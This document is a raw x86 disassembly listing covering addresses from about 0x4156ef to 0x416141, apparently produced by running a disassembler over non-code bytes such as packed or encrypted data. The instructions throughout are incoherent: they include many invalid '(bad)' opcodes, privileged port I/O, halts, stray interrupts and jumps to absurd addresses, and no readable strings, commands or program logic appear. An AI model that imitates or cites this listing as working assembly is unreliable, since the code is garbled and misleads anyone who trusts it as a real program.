  4156ef:	sbb    ebx,DWORD PTR [ebx-0x38]
  4156f2:	push   ds
  4156f3:	fimul  WORD PTR [eax]
  4156f5:	pop    edx
  4156f6:	jbe    0x41570b
  4156f8:	inc    edi
  4156f9:	scas   al,BYTE PTR es:[edi]
  4156fa:	into   
  4156fb:	inc    eax
  4156fc:	or     ecx,0x61
  4156ff:	(bad)  
  415701:	jnp    0x4156f2
  415703:	sbb    al,0x48
  415705:	scas   eax,DWORD PTR es:[edi]
  415706:	inc    ecx
  415707:	mov    ecx,0xcf21c540
  41570c:	mov    edx,0xaadf5cec
  415711:	addr16 jns 0x415766
  415714:	int    0x1c
  415716:	dec    esi
  415717:	inc    esi
  415718:	out    dx,al
  415719:	xchg   edi,eax
  41571a:	enter  0x8036,0x58
  41571e:	mov    ebx,0xa1b4dfcf
  415723:	es jb  0x415773
  415726:	hlt    
  415727:	adc    eax,DWORD PTR [ebx+eax*1]
  41572a:	rcr    BYTE PTR [edi+ecx*1-0x1a],0xf4
  41572f:	push   edi
  415730:	hlt    
  415731:	popf   
  415732:	xlat   BYTE PTR ds:[ebx]
  415733:	mov    al,BYTE PTR [eax+0x11]
  415736:	ror    al,1
  415738:	out    dx,al
  415739:	xor    BYTE PTR [esi+0x59014f4c],ch
  41573f:	mov    dh,BYTE PTR [ebp+0x1eedac40]
  415745:	inc    edi
  415746:	fld    DWORD PTR [edx-0x724771bf]
  41574c:	rcl    cl,cl
  41574e:	mov    ah,BYTE PTR [esi-0x690c4ce0]
  415754:	sbb    DWORD PTR [eax],ebp
  415756:	jge    0x41579a
  415758:	jmp    FWORD PTR [esi+0x5fadfb6c]
  41575e:	mov    cl,0x29
  415760:	pop    eax
  415761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415762:	mov    bh,0xe3
  415764:	pop    edi
  415765:	mov    bh,0x6c
  415767:	aam    0x8c
  415769:	(bad)  
  41576a:	(bad)  
  41576b:	mov    ch,0x63
  41576d:	xchg   edx,eax
  41576e:	pop    edi
  41576f:	int    0x44
  415771:	push   edx
  415772:	pop    ebp
  415773:	xchg   ebx,eax
  415774:	rol    BYTE PTR [ebp-0x5def085a],cl
  41577a:	std    
  41577b:	jge    0x415778
  41577d:	xlat   BYTE PTR ds:[ebx]
  41577e:	sbb    ah,0x74
  415781:	and    ecx,DWORD PTR [ecx-0x56bfa868]
  415787:	sub    BYTE PTR [esi+0xa],al
  41578a:	push   es
  41578b:	xor    ah,BYTE PTR [ebx+0x40]
  41578e:	cli    
  41578f:	fwait
  415790:	ret    
  415791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415792:	sti    
  415793:	int3   
  415794:	popf   
  415795:	mov    eax,0xc48cc256
  41579a:	xchg   edi,eax
  41579b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41579c:	pushf  
  41579d:	sbb    al,0x15
  41579f:	out    0x7f,eax
  4157a1:	aad    0x5a
  4157a3:	test   ah,dl
  4157a5:	jl     0x415789
  4157a7:	jbe    0x4157e1
  4157a9:	jmp    0x2cf7d949
  4157ae:	mov    BYTE PTR [edx+0x76],ah
  4157b1:	fistp  DWORD PTR [edi]
  4157b3:	add    BYTE PTR [eax],cl
	...
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx-0x1151961d]
  415823:	jl     0x415899
  415825:	outs   dx,BYTE PTR ds:[esi]
  415826:	fs loopne 0x415829
  415829:	add    BYTE PTR [edi],al
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    BYTE PTR [edx+0x7a],dh
  415830:	pop    es
  415831:	inc    ebp
  415832:	push   cs
  415833:	mov    ds:0xd55c305f,eax
  415838:	jns    0x415869
  41583a:	ins    DWORD PTR es:[edi],dx
  41583b:	xor    eax,DWORD PTR [eax]
  41583d:	mov    eax,0xbcb1a232
  415842:	push   esi
  415843:	sub    cl,ah
  415845:	call   0x18b2:0x6d3582b0
  41584c:	stc    
  41584d:	jmp    0xe89ace0d
  415852:	push   esi
  415853:	xor    cl,BYTE PTR [edi+0x68521630]
  415859:	mov    DWORD PTR [ecx+0x73],ebx
  41585c:	ins    DWORD PTR es:[edi],dx
  41585d:	cli    
  41585e:	pop    ss
  41585f:	test   al,0xff
  415861:	loope  0x415858
  415863:	repz shrd DWORD PTR [ebx+0x121f7498],ebx,cl
  41586b:	nop
  41586c:	dec    edi
  41586d:	addr16 mov al,ds:0x42b1
  415871:	dec    edx
  415872:	outs   dx,DWORD PTR ds:[esi]
  415873:	das    
  415874:	js     0x4158da
  415876:	(bad)  
  415878:	(bad)  
  415879:	aam    0x60
  41587b:	xor    esi,0x62
  41587e:	shr    BYTE PTR [eax-0x18],0x88
  415882:	dec    esp
  415883:	pop    esi
  415884:	fidivr DWORD PTR [esi-0x3d]
  415887:	jge    0x415854
  415889:	and    BYTE PTR [eax+0x15],bl
  41588c:	add    al,BYTE PTR [eax+ebp*8-0x795f9354]
  415893:	mov    ecx,es
  415895:	jno    0x415897
  415897:	jae    0x4158c1
  415899:	leave  
  41589a:	mov    cl,0xda
  41589c:	int    0xe0
  41589e:	shr    BYTE PTR [edi+0x1e753e97],1
  4158a4:	or     ebx,ecx
  4158a6:	cmp    DWORD PTR [ebx+0x28c7a8d9],esp
  4158ac:	adc    al,0xb8
  4158ae:	jbe    0x4158f5
  4158b0:	rcr    DWORD PTR [edi],0x9f
  4158b3:	adc    dh,BYTE PTR [ecx-0x313a894e]
  4158b9:	xchg   ebp,eax
  4158ba:	call   0xc611:0xc0fee2e
  4158c1:	nop
  4158c2:	jl     0x415878
  4158c4:	cs adc eax,0x94a39843
  4158ca:	popf   
  4158cb:	and    ebp,DWORD PTR [edx-0x57]
  4158ce:	rcr    DWORD PTR [esi-0x9],1
  4158d1:	gs push edx
  4158d3:	lea    ebx,[edi-0x1f]
  4158d6:	dec    ebp
  4158d7:	(bad)  
  4158d8:	inc    ebx
  4158d9:	xor    al,0xfb
  4158db:	(bad)  
  4158dc:	mul    DWORD PTR [edi+0x2e]
  4158df:	stos   DWORD PTR es:[edi],eax
  4158e0:	add    eax,0xb4a6f1b3
  4158e5:	add    dh,BYTE PTR [esi-0x3220449d]
  4158eb:	jb     0x415945
  4158ed:	pop    ds
  4158ee:	imul   ebx,ecx,0x327322e8
  4158f4:	out    0xf8,eax
  4158f6:	xchg   edx,eax
  4158f7:	dec    edi
  4158f8:	ret    
  4158f9:	or     eax,0x7f583d64
  4158fe:	js     0x415909
  415900:	or     ebp,DWORD PTR [edx]
  415902:	cmp    edx,edi
  415904:	fist   DWORD PTR ds:0x6e15565c
  41590a:	ret    0x88d7
  41590d:	add    cl,cl
  41590f:	mov    cl,0x8c
  415911:	je     0x415953
  415913:	pop    ss
  415914:	lock xchg esi,eax
  415916:	xchg   esi,eax
  415917:	jecxz  0x415967
  415919:	test   ecx,eax
  41591b:	test   al,0x36
  41591d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41591e:	adc    DWORD PTR [esi],0x32
  415921:	test   DWORD PTR [edi-0x24],esi
  415924:	loope  0x4158cd
  415926:	mov    al,ds:0x2353117d
  41592b:	fs and eax,0xc91f4296
  415931:	mov    DWORD PTR [esi-0x26],esi
  415934:	fild   WORD PTR [eax]
	...
  415996:	inc    ebp
  415997:	mov    BYTE PTR [edi+esi*2],ch
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0xef
  4159a3:	pop    ebx
  4159a4:	stos   DWORD PTR es:[edi],eax
  4159a5:	hlt    
  4159a6:	imul   esp,ecx,0x0
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    ch,dh
  4159af:	xchg   BYTE PTR [esi+eax*2+0x2b],bl
  4159b3:	mov    WORD PTR [edx-0x3aa41dd8],cs
  4159b9:	fild   WORD PTR [ebp-0x4d0c5696]
  4159bf:	into   
  4159c0:	push   esp
  4159c1:	or     BYTE PTR [esi+0x25bb3d61],dh
  4159c7:	inc    ebx
  4159c8:	add    BYTE PTR [ebp+0x2b],0x36
  4159cc:	xor    DWORD PTR [eax],ebp
  4159ce:	enter  0xd0b6,0xd5
  4159d2:	mov    ah,0x71
  4159d4:	jae    0x415959
  4159d6:	fistp  DWORD PTR [ebx+ebp*1-0x69f025f5]
  4159dd:	or     bh,BYTE PTR [esi]
  4159df:	les    ebx,FWORD PTR [esi+0x41e1856c]
  4159e5:	(bad)  
  4159e6:	mul    esp
  4159e8:	lock mov BYTE PTR [ecx-0x28],bh
  4159ec:	cmp    eax,0x1a7be0ec
  4159f1:	mov    ch,0x71
  4159f3:	mov    cs,WORD PTR [esi-0x71]
  4159f6:	out    0x21,eax
  4159f8:	mov    cl,0x9f
  4159fa:	leave  
  4159fb:	jb     0x415a30
  4159fd:	push   edi
  4159fe:	inc    ebx
  4159ff:	shl    ecx,1
  415a01:	cld    
  415a02:	cmc    
  415a03:	and    eax,0xeb1632e4
  415a08:	jle    0x415a2d
  415a0a:	sub    eax,0xe24891a
  415a0f:	cdq    
  415a10:	push   cs
  415a11:	test   al,0xc1
  415a13:	data16 jg 0x415a83
  415a16:	inc    ebx
  415a17:	sub    eax,0xb3a6c4c5
  415a1c:	mov    edx,0xabcc8f3f
  415a21:	push   edi
  415a22:	sbb    al,0x75
  415a24:	mov    cl,0xd7
  415a26:	outs   dx,BYTE PTR ds:[esi]
  415a27:	xchg   esp,eax
  415a28:	(bad)  
  415a29:	mov    ebx,0x40fd9a92
  415a2e:	mov    BYTE PTR [eax],ch
  415a30:	push   ds
  415a31:	rcl    BYTE PTR [edx],0x32
  415a34:	inc    ebp
  415a35:	pop    ebp
  415a36:	pop    cx
  415a38:	jnp    0x415a4f
  415a3a:	fnsave [eax+edi*8]
  415a3d:	sbb    esi,DWORD PTR [edi]
  415a3f:	pop    esi
  415a40:	xchg   esi,eax
  415a41:	jecxz  0x4159f7
  415a43:	call   0x339ba72d
  415a48:	cmp    edx,DWORD PTR [ebp+0x407feb0e]
  415a4e:	fist   WORD PTR [ecx-0x3b]
  415a51:	cmc    
  415a52:	sbb    ebx,DWORD PTR [esi-0x4e]
  415a55:	int3   
  415a56:	xor    eax,esp
  415a58:	out    dx,eax
  415a59:	sbb    al,0xb3
  415a5b:	pop    ecx
  415a5c:	push   0x94ea84cd
  415a61:	imul   edx,DWORD PTR [edx+eax*1-0x53],0x74
  415a66:	xchg   ebp,eax
  415a67:	push   edi
  415a68:	dec    ebx
  415a69:	add    DWORD PTR [edx],eax
  415a6b:	push   edi
  415a6c:	adc    DWORD PTR [eax],edx
  415a6e:	in     al,dx
  415a6f:	mov    cl,0xd2
  415a71:	call   0x4be300d6
  415a76:	fst    DWORD PTR [ebx+0x2f2c39bc]
  415a7c:	in     eax,dx
  415a7d:	sbb    al,0x1
  415a7f:	mov    al,0x35
  415a81:	adc    BYTE PTR [ebx-0x2180fe93],dl
  415a87:	loope  0x415b08
  415a89:	out    0x1d,al
  415a8b:	popf   
  415a8c:	or     ebx,eax
  415a8e:	adc    BYTE PTR [ebp-0x41a2b1db],bh
  415a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a95:	ror    ch,1
  415a97:	bound  eax,QWORD PTR [ecx+0x2d920731]
  415a9d:	xor    eax,0x91cbc470
  415aa2:	jg     0x415ab5
  415aa4:	cli    
  415aa5:	fwait
  415aa6:	or     DWORD PTR [edi+0x30829226],esi
  415aac:	jmp    0x8ce588d3
  415ab1:	mov    ds:0x74c1c8,eax
	...
  415b16:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0xb098d529
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [ebp-0x6d],cl
  415b30:	lods   al,BYTE PTR ds:[esi]
  415b31:	ja     0x415afc
  415b33:	retf   0xfece
  415b36:	pop    esp
  415b37:	sbb    al,0x56
  415b39:	xchg   ecx,eax
  415b3a:	xor    DWORD PTR [ebx+ebx*4],edx
  415b3d:	dec    esi
  415b3e:	out    0xaf,al
  415b40:	cli    
  415b41:	retf   0x45c5
  415b44:	cmp    eax,0xd262614b
  415b49:	shl    DWORD PTR [ecx],1
  415b4b:	rcr    DWORD PTR [esi],0x78
  415b4e:	fimul  WORD PTR [ebp-0x525c567e]
  415b54:	mov    ecx,0x6da2533f
  415b59:	jnp    0x415b66
  415b5b:	jo     0x415b82
  415b5d:	mov    cl,0x6a
  415b5f:	push   edi
  415b60:	jo     0x415b50
  415b62:	jne    0x415b80
  415b64:	xchg   edx,eax
  415b65:	xchg   ebp,eax
  415b66:	add    al,0x67
  415b68:	pushf  
  415b69:	xchg   ecx,eax
  415b6a:	out    0x68,al
  415b6c:	gs repz jnp 0x415b19
  415b70:	shr    BYTE PTR [eax-0x4a],cl
  415b73:	out    0x65,eax
  415b75:	sub    BYTE PTR [eax],bh
  415b77:	test   BYTE PTR [ecx+0x7c25ae0f],dl
  415b7d:	xor    DWORD PTR [esi],esi
  415b7f:	shl    DWORD PTR [edx+0x31669ab2],1
  415b85:	pop    esi
  415b86:	xor    BYTE PTR [edx+0x1a05078f],bl
  415b8c:	or     al,0xba
  415b8e:	sbb    DWORD PTR [edx+0x6638459b],ebp
  415b94:	lds    ecx,FWORD PTR [esi]
  415b96:	xor    bl,bl
  415b98:	xchg   BYTE PTR [ecx-0x5],ah
  415b9b:	imul   eax,DWORD PTR [esi+0x214da2e5],0xffffffb0
  415ba2:	dec    ecx
  415ba3:	xchg   DWORD PTR [ebx],edi
  415ba5:	dec    ebx
  415ba6:	in     al,0x9e
  415ba8:	cmp    al,0xf4
  415baa:	mov    WORD PTR [ebx+0x22],fs
  415bad:	adc    DWORD PTR [eax+0x3c1e2e18],esp
  415bb3:	lods   al,BYTE PTR ds:[esi]
  415bb4:	jmp    0x415bc5
  415bb6:	out    dx,eax
  415bb7:	or     al,0x9f
  415bb9:	add    ch,BYTE PTR [ecx]
  415bbb:	neg    DWORD PTR [ebp-0xe]
  415bbe:	pusha  
  415bbf:	fsubr  DWORD PTR [edx-0x20]
  415bc2:	or     BYTE PTR [esi],ch
  415bc4:	ss js  0x415b63
  415bc7:	test   BYTE PTR [edi-0x3d],0xcb
  415bcb:	ss stos DWORD PTR es:[edi],eax
  415bcd:	fsub   QWORD PTR [eiz*8-0x53263ed8]
  415bd4:	fldenv [esi-0x37]
  415bd7:	mov    esi,0xf2e24e39
  415bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bdd:	stos   BYTE PTR es:[edi],al
  415bde:	sub    edi,DWORD PTR [edi+0x4ce33092]
  415be4:	or     cl,BYTE PTR [eax+0x30061f2]
  415bea:	repnz jmp 0x4cb8:0x216d66ab
  415bf2:	cmp    BYTE PTR [ebx+0x8a32b6],dh
  415bf8:	xchg   ebp,eax
  415bf9:	pop    esp
  415bfa:	xchg   ebp,eax
  415bfb:	jne    0x415b8d
  415bfd:	shl    BYTE PTR [eax-0x516b0395],0xb6
  415c04:	mov    ecx,0xf537f8ee
  415c09:	dec    ebx
  415c0a:	xor    BYTE PTR [edi],0xd
  415c0d:	hlt    
  415c0e:	xor    eax,0x3c8fc1b7
  415c13:	popa   
  415c14:	inc    ecx
  415c15:	add    BYTE PTR [esi-0x44],cl
  415c18:	leave  
  415c19:	arpl   WORD PTR [ebx+0x7c],cx
  415c1c:	hlt    
  415c1d:	data16 cmc 
  415c1f:	imul   esi,eax,0xc64a3436
  415c25:	fsub   DWORD PTR [edi+eax*8]
  415c28:	jg     0x415bb0
  415c2a:	ins    BYTE PTR es:[edi],dx
  415c2b:	mov    edx,0x127c2939
  415c30:	pop    es
  415c31:	ret    0x262e
  415c34:	in     al,dx
	...
  415c95:	add    BYTE PTR [edx],bh
  415c97:	adc    BYTE PTR [edi-0x444040c4],bh
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0x36cad70f
  415ca5:	inc    ecx
  415ca6:	jns    0x415c8b
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    BYTE PTR [ebx-0x5f],ch
  415cb0:	xchg   DWORD PTR [ecx+0x19],ecx
  415cb3:	mov    cl,0x6a
  415cb5:	xchg   edx,eax
  415cb6:	icebp  
  415cb7:	cmp    ecx,DWORD PTR [ebx]
  415cb9:	sub    al,0xdb
  415cbb:	jbe    0x415c82
  415cbd:	jo     0x415d17
  415cbf:	cld    
  415cc0:	cli    
  415cc1:	lock mov al,ds:0x3977850f
  415cc7:	out    0x88,al
  415cc9:	inc    esi
  415cca:	jmp    0xdc49ac65
  415ccf:	sbb    DWORD PTR [ecx+0x124be08d],esi
  415cd5:	std    
  415cd6:	jns    0x415d48
  415cd8:	mov    WORD PTR ds:0x6f7a03fc,ss
  415cde:	and    eax,0x6fed1ab3
  415ce3:	push   esp
  415ce4:	das    
  415ce5:	pop    ecx
  415ce6:	iret   
  415ce7:	jge    0x415ccb
  415ce9:	out    0x26,al
  415ceb:	jae    0x415d3f
  415ced:	and    DWORD PTR ds:0xf96d426f,eax
  415cf3:	dec    ebp
  415cf4:	pusha  
  415cf5:	xor    DWORD PTR [edi+esi*4+0x660d436b],edi
  415cfc:	jp     0x415cb7
  415cfe:	mov    esp,0x319d08ac
  415d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d04:	and    DWORD PTR [esi-0x5c],esi
  415d07:	mov    bh,0xc6
  415d09:	adc    esi,esi
  415d0b:	jl     0x415caa
  415d0d:	sub    edx,DWORD PTR [eax+eiz*2]
  415d10:	or     DWORD PTR [ebx+0x14],ebp
  415d13:	in     eax,dx
  415d14:	test   BYTE PTR cs:[ebx-0x1bfc3231],0x1a
  415d1c:	int3   
  415d1d:	iret   
  415d1e:	push   esi
  415d1f:	fwait
  415d20:	inc    eax
  415d21:	mov    ebp,0xd1f390be
  415d26:	dec    edx
  415d27:	mov    ecx,0xbea5b472
  415d2c:	xor    BYTE PTR [eax-0x638cdb1],bl
  415d32:	jmp    DWORD PTR [eax+esi*4]
  415d35:	or     eax,0xbf95784c
  415d3a:	adc    DWORD PTR [edx+0x53974d5b],edx
  415d40:	(bad)  
  415d41:	add    al,0x7
  415d43:	rol    DWORD PTR [edi+0xf],cl
  415d46:	pusha  
  415d47:	xchg   edx,eax
  415d48:	mov    bl,0xbe
  415d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d4b:	pop    ebp
  415d4c:	leave  
  415d4d:	sub    al,0xde
  415d4f:	fdiv   QWORD PTR [ecx]
  415d51:	push   ebx
  415d52:	test   eax,0x3ffc986d
  415d57:	xchg   edx,eax
  415d58:	xlat   BYTE PTR ds:[ebx]
  415d59:	cmp    edi,eax
  415d5b:	pop    esi
  415d5c:	add    al,BYTE PTR [esi]
  415d5e:	popf   
  415d5f:	mov    dh,0x17
  415d61:	mov    esi,0xdcfe87b4
  415d66:	cmp    al,BYTE PTR [eax-0x770e1358]
  415d6c:	stos   BYTE PTR es:[edi],al
  415d6d:	adc    BYTE PTR [ecx],dl
  415d6f:	xor    BYTE PTR [ebx+ebp*8],bh
  415d72:	mov    ecx,0x94e429fc
  415d77:	adc    eax,0x620d0894
  415d7c:	mov    dl,0x9c
  415d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d7f:	push   esi
  415d80:	sbb    BYTE PTR [ecx-0x34],ch
  415d83:	lahf   
  415d84:	mov    ch,0x8
  415d86:	mov    eax,0xe24da7c4
  415d8b:	push   ds
  415d8c:	sbb    al,0xf1
  415d8e:	imul   eax,esp,0xf3df7ba4
  415d94:	in     al,0xbd
  415d96:	je     0x415d65
  415d98:	mov    BYTE PTR [edx-0x71a30d1d],bh
  415d9e:	js     0x415d4a
  415da0:	pop    eax
  415da1:	(bad)  
  415da2:	xor    al,0x6
  415da4:	daa    
  415da5:	pop    eax
  415da6:	mov    ds:0xc7c6856b,eax
  415dab:	push   0x72
  415dad:	sar    edi,1
  415daf:	xchg   esp,eax
  415db0:	add    bl,ch
  415db2:	iret   
  415db3:	mov    ebx,0x65
	...
  415e14:	add    BYTE PTR [eax],al
  415e16:	out    dx,al
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x46495606
  415e24:	xchg   BYTE PTR [ecx-0x80],dl
  415e27:	in     al,0x0
  415e29:	add    BYTE PTR [edi],al
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [ecx],al
  415e2f:	pop    ss
  415e30:	xchg   esi,eax
  415e31:	pop    edx
  415e32:	outs   dx,DWORD PTR ds:[esi]
  415e33:	out    dx,al
  415e34:	cwde   
  415e35:	enter  0xf2b0,0x7d
  415e39:	je     0x415ea4
  415e3b:	shr    DWORD PTR [ecx-0x2c],0x51
  415e3f:	xor    DWORD PTR [edx+0x32],ebp
  415e42:	mov    ebp,DWORD PTR gs:[ecx+0x23]
  415e46:	retf   0xcdf1
  415e49:	call   0x3c58:0x3fbcff6f
  415e50:	mov    bh,0x6e
  415e52:	xchg   ebx,eax
  415e53:	xor    BYTE PTR [edx],0xf3
  415e56:	push   ebp
  415e57:	bound  edx,QWORD PTR [edi+0x5b]
  415e5a:	pushf  
  415e5b:	sub    eax,0x28ad8444
  415e60:	and    eax,0xf901cc26
  415e65:	ins    DWORD PTR es:[edi],dx
  415e66:	mov    al,0x7e
  415e68:	retf   0x6a28
  415e6b:	cmp    dh,bh
  415e6d:	ret    0xa1f5
  415e70:	dec    ecx
  415e71:	add    eax,0xdcfe249a
  415e76:	push   es
  415e77:	jge    0x415ef6
  415e79:	popa   
  415e7a:	test   BYTE PTR [ecx-0xc],dl
  415e7d:	and    DWORD PTR [edi],0x2e
  415e80:	xchg   DWORD PTR [edi],ebp
  415e82:	sbb    BYTE PTR [esi+0x1584e839],ah
  415e88:	dec    ebp
  415e89:	jge    0x415ec5
  415e8b:	test   eax,0x6978b85c
  415e90:	jle    0x415edb
  415e92:	jmp    DWORD PTR [edx]
  415e94:	sbb    ecx,DWORD PTR [ecx+0x26042f8]
  415e9a:	push   0xffffffde
  415e9c:	addr16 cld 
  415e9e:	aaa    
  415e9f:	loopne 0x415edc
  415ea1:	push   cs
  415ea2:	setnp  BYTE PTR [ecx]
  415ea5:	mov    esp,0xbe113baf
  415eaa:	shl    bh,0xfb
  415ead:	mov    ds:0xb64c32b1,al
  415eb2:	xchg   ebp,eax
  415eb3:	jg     0x415eff
  415eb5:	xor    BYTE PTR [eax-0x1d06ed06],dh
  415ebb:	and    al,0xbc
  415ebd:	outs   dx,DWORD PTR ds:[esi]
  415ebe:	jbe    0x415f23
  415ec0:	jp     0x415f22
  415ec2:	lahf   
  415ec3:	add    DWORD PTR [ebx],ebp
  415ec5:	mov    eax,0x3ba40103
  415eca:	gs (bad) 
  415ecc:	int    0xa
  415ece:	xchg   edi,eax
  415ecf:	test   eax,edi
  415ed1:	stos   DWORD PTR es:[edi],eax
  415ed2:	mul    DWORD PTR [esi+0x3c]
  415ed5:	ins    DWORD PTR es:[edi],dx
  415ed6:	inc    ecx
  415ed7:	or     BYTE PTR [ebp+0x1e804fd3],0x33
  415ede:	les    edx,FWORD PTR ds:0x5aeec4e3
  415ee4:	lea    ecx,[esi+eiz*4-0x64]
  415ee8:	dec    edi
  415ee9:	shr    DWORD PTR [ebx+esi*2-0x7ae4b046],0x48
  415ef1:	lock mov dh,0x6
  415ef4:	aam    0x95
  415ef6:	sub    ah,ch
  415ef8:	inc    esi
  415ef9:	stos   DWORD PTR es:[edi],eax
  415efa:	mov    DWORD PTR [ebx+0x56],edx
  415efd:	leave  
  415efe:	dec    esp
  415eff:	loop   0x415f80
  415f01:	cs mov ah,0x4f
  415f04:	(bad)  
  415f06:	push   eax
  415f07:	mov    esi,gs
  415f09:	inc    edx
  415f0a:	sub    ecx,ebp
  415f0c:	mov    eax,0xf42294c0
  415f11:	add    bh,dl
  415f13:	add    al,0x26
  415f15:	sub    esp,DWORD PTR [ecx]
  415f17:	(bad)  [esp+ebx*1+0x6e3f4cfb]
  415f1e:	fbld   TBYTE PTR [ebp+0x76ab5bda]
  415f24:	mov    dl,0x1b
  415f26:	sbb    al,0xd1
  415f28:	shr    edi,1
  415f2a:	push   cs
  415f2b:	mov    BYTE PTR [edx-0x63],dl
  415f2e:	cwde   
  415f2f:	outs   dx,BYTE PTR ds:[esi]
  415f30:	or     BYTE PTR [edi+0x4526c5],bh
	...
  415f96:	pop    ss
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	sbb    BYTE PTR [eax-0x4a],dl
  415fa5:	mov    ecx,0xe587
  415faa:	pop    es
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR [esi+eax*4-0xa],ch
  415fb1:	xchg   ebp,eax
  415fb2:	pop    es
  415fb3:	mov    al,0x26
  415fb5:	adc    edx,DWORD PTR [ebx-0x245e6579]
  415fbb:	jl     0x415fef
  415fbd:	daa    
  415fbe:	sbb    DWORD PTR ds:0xe7cd0da9,esi
  415fc4:	fdivr  st,st(3)
  415fc6:	jnp    0x415ffa
  415fc8:	out    dx,al
  415fc9:	dec    ecx
  415fca:	out    0xeb,eax
  415fcc:	sbb    cl,BYTE PTR [edx]
  415fce:	cmp    al,0xb9
  415fd0:	fwait
  415fd1:	arpl   WORD PTR [ecx+0x3f],ax
  415fd4:	pop    ebx
  415fd5:	stos   DWORD PTR es:[edi],eax
  415fd6:	inc    esi
  415fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd8:	cmp    ah,BYTE PTR [edi+0x44]
  415fdb:	(bad)  
  415fdc:	iret   
  415fdd:	inc    edx
  415fde:	sbb    eax,DWORD PTR [esi+ecx*2]
  415fe1:	pop    ss
  415fe2:	mov    ds:0x545d09da,al
  415fe7:	shl    DWORD PTR [edi+0x66],cl
  415fea:	cmp    BYTE PTR [esi+0x8],ah
  415fed:	mov    WORD PTR [ecx+edx*4],?
  415ff0:	int3   
  415ff1:	pop    ebp
  415ff2:	mov    bh,bl
  415ff4:	js     0x416063
  415ff6:	mov    edi,0xd63ef217
  415ffb:	inc    ebp
  415ffc:	sbb    eax,esi
  415ffe:	repnz clc 
  416000:	xor    cl,BYTE PTR [esi+0x21]
  416003:	jmp    0x83fc6678
  416008:	ret    0x87bc
  41600b:	sbb    ebx,ebp
  41600d:	xor    eax,0x5cdba44b
  416012:	xor    edi,edi
  416014:	mov    esp,0xd32bdaec
  416019:	dec    esi
  41601a:	dec    edx
  41601b:	mov    ds:0xa964ddbf,al
  416020:	in     eax,0xb7
  416022:	mov    al,0xa4
  416024:	jns    0x415fd5
  416026:	xchg   ecx,eax
  416027:	push   0xbeccec0
  41602c:	pop    ss
  41602d:	jbe    0x415fdb
  41602f:	push   edx
  416030:	push   edi
  416031:	adc    BYTE PTR [ecx-0x4687fa5c],bl
  416037:	ficomp WORD PTR [ebx+0x338ceaee]
  41603d:	pop    es
  41603e:	add    eax,0x7fb233fe
  416043:	cmc    
  416044:	(bad)  [esi+0x1416d870]
  41604a:	iret   
  41604b:	rol    bl,cl
  41604d:	and    cl,BYTE PTR [ebx+0x2f]
  416050:	jns    0x41604a
  416052:	inc    esi
  416053:	push   ebp
  416054:	add    eax,0xb62090b7
  416059:	push   es
  41605a:	mov    dh,0x84
  41605c:	jl     0x41608d
  41605e:	dec    esi
  41605f:	push   es
  416060:	cmp    edi,edi
  416062:	das    
  416063:	inc    ebp
  416064:	icebp  
  416065:	int    0x65
  416067:	loop   0x41608d
  416069:	mov    bl,0x2e
  41606b:	mov    ebp,0x618e0694
  416070:	pop    ss
  416071:	popa   
  416072:	cmp    eax,0x5ac62b85
  416077:	adc    dl,0xe7
  41607a:	add    DWORD PTR [ebp+0x1b],edx
  41607d:	cmp    esi,0x9aea55ec
  416083:	xor    BYTE PTR [edx],dh
  416085:	adc    al,BYTE PTR [edx+0x2c]
  416088:	in     al,dx
  416089:	mov    edi,0xa53233e8
  41608e:	aaa    
  41608f:	adc    eax,0x9792489a
  416094:	sub    al,0x17
  416096:	jns    0x41610f
  416098:	cmp    ah,BYTE PTR [esi]
  41609a:	xchg   ebx,eax
  41609b:	pop    ss
  41609c:	mov    fs,ebp
  41609e:	add    al,BYTE PTR [edx+ebp*1-0x76]
  4160a2:	sti    
  4160a3:	aad    0xda
  4160a5:	xor    al,0x2
  4160a7:	cmp    BYTE PTR [edx-0x5b5fec11],al
  4160ad:	shl    dh,1
  4160af:	and    dh,BYTE PTR [eax]
  4160b1:	push   edi
  4160b2:	sbb    al,0x61
  4160b4:	jmp    0x4160b6
	...
  416116:	and    cl,ch
  416118:	cmp    ebx,esi
  41611a:	sti    
  41611b:	fsubrp st(5),st
  41611d:	jmp    DWORD PTR [edx]
  41611f:	fwait
  416120:	xchg   DWORD PTR [ecx],edx
  416122:	test   eax,0x8efe482e
  416127:	out    0x0,al
  416129:	add    BYTE PTR [edi],al
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    al,cl
  41612f:	xor    ebx,edx
  416131:	ja     0x4160bf
  416133:	inc    edi
  416134:	inc    eax
  416135:	lock nop
  416137:	adc    eax,0x3b462c14
  41613c:	sbb    eax,0x61a77e04
  416141:	das    
